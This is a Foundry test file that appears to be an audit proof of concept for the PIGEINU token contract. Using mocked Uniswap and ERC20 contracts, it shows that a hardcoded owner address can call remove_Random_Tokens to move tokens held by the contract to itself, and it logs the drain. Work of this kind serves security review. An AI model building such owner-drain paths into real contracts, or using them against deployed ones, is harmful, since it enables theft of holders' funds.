// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PIGEINU.sol";

contract MockWETH {
    string public constant name = "WETH";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    
    constructor() payable {}
    
    receive() external payable {}
    
    function balanceOf(address) external pure returns (uint256) {
        return 1000 ether;
    }
}

contract MockUniswapV2Factory {
    address public pair;
    
    constructor(address _pair) {
        pair = _pair;
    }
    
    function createPair(address, address) external view returns (address) {
        return pair;
    }
}

contract MockUniswapV2Router {
    address public immutable factory;
    address public immutable WETH;
    
    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    
    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
    
    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockUniswapV2Pair {}

contract PIGEINU_RandomTokenDrainTest is Test {
    PIGEINU token;
    MockERC20 mockToken;
    address constant OWNER = 0xA4b0588Df297921eF93fDa96979Bf0Db97E2F0df;
    address constant UNISWAP_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        // Set up all mock contracts
        MockWETH weth = new MockWETH();
        MockUniswapV2Pair mockPair = new MockUniswapV2Pair();
        MockUniswapV2Factory mockFactory = new MockUniswapV2Factory(address(mockPair));
        MockUniswapV2Router mockRouter = new MockUniswapV2Router(address(mockFactory), address(weth));
        
        // Replace hardcoded router code with mock
        vm.etch(UNISWAP_ROUTER, address(mockRouter).code);
        
        // Deploy main token
        token = new PIGEINU();
        
        // Deploy mock token for drain test
        mockToken = new MockERC20("MockToken", "MTK", 18);
        
        // Mint test tokens to token contract
        mockToken.mint(address(token), 1000 * 10**18);
    }

    function testOwnerCanDrainRandomTokens() public {
        // Differential: Capture initial state
        console2.log("--- BEFORE-Trigger state ---");
        uint256 contractBalanceBefore = mockToken.balanceOf(address(token));
        uint256 ownerBalanceBefore = mockToken.balanceOf(OWNER);
        console2.log("Contract's mockToken balance (before): %s", contractBalanceBefore);
        console2.log("Owner's mockToken balance (before): %s", ownerBalanceBefore);

        // Trigger the drain attack
        console2.log("--- Trigger remove_Random_Tokens ---");
        vm.startPrank(OWNER);
        token.remove_Random_Tokens(address(mockToken), 100);
        vm.stopPrank();

        // Differential: Capture final state
        console2.log("--- AFTER-Trigger state ---");
        uint256 contractBalanceAfter = mockToken.balanceOf(address(token));
        uint256 ownerBalanceAfter = mockToken.balanceOf(OWNER);
        console2.log("Contract's mockToken balance (after): %s", contractBalanceAfter);
        console2.log("Owner's mockToken balance (after): %s", ownerBalanceAfter);

        // Calculate state changes
        uint256 contractLoss = contractBalanceBefore - contractBalanceAfter;
        uint256 ownerGain = ownerBalanceAfter - ownerBalanceBefore;
        console2.log("Contract loss: %s tokens", contractLoss);
        console2.log("Owner gain: %s tokens", ownerGain);
        
        // Vulnerability verification conditions
        bool drainComplete = contractBalanceAfter == 0;
        bool tokensMovedToOwner = contractLoss > 0 && contractLoss == ownerGain;
        
        console2.log("Contract drained completely: %s", drainComplete ? "YES" : "NO");
        console2.log("Owner received full amount: %s", tokensMovedToOwner ? "YES" : "NO");
        
        // Final verdict logic
        if (drainComplete && tokensMovedToOwner) {
            console2.log("Vulnerability Exists: Owner was able to drain contract's tokens");
        } else {
            console2.log("Vulnerability not Exist: Attack failed to transfer tokens as expected");
        }
    }
}